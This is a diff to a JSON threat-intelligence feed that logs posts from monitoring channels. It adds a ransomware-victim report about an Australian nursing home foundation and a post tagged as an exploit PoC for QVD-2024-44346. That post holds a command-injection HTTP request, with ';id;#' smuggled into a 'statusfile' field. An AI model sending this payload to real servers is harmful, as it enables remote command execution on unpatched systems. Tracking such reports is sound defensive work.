@@ -4341,6 +4341,18 @@
             "URLs": [
                 "s://darkwebinformer.com/a-threat-actor-is-allegedly-selling-anti-money-laundering-compliance-checker-documents/\n\nA "
             ]
+        },
+        {
+            "Message ID": 6072,
+            "discovered": "2024-10-29",
+            "post_title": "🚨🚨🇦🇺Australian Nursing Home Foundation Has Been Claimed a Victim to Abyss Ransomware\n\nhttps://darkwebinformer.com/australian-nursing-home-foundation-has-been-claimed-a-victim-to-abyss-ransomware/\n\nThe group claims to have acquired 1.5 TB of uncompressed data from the organization and has announced that they will release the password to access the data on November 5th.",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": [
+                "s://darkwebinformer.com/australian-nursing-home-foundation-has-been-claimed-a-victim-to-abyss-ransomware/\n\nTh"
+            ]
         }
     ],
     "RipperSec | 团队": [
@@ -7435,6 +7447,16 @@
             "Message ID": 2459,
             "discovered": "2024-10-28",
             "post_title": null,
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": []
+        },
+        {
+            "Message ID": 2460,
+            "discovered": "2024-10-29",
+            "post_title": "QVD-2024-44346\n\nOPTIONS /dataBases/upgrademysqlstatus HTTP/1.1\nHost: \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0\nContent-Type: application/json\nConnection: close\n \n{\"statusfile\":\"/dev/null; id; #\"}\n\nid\n\n#exploit #poc",
             "Attack Type": "Unknown",
             "Location": [
                 "N/A"
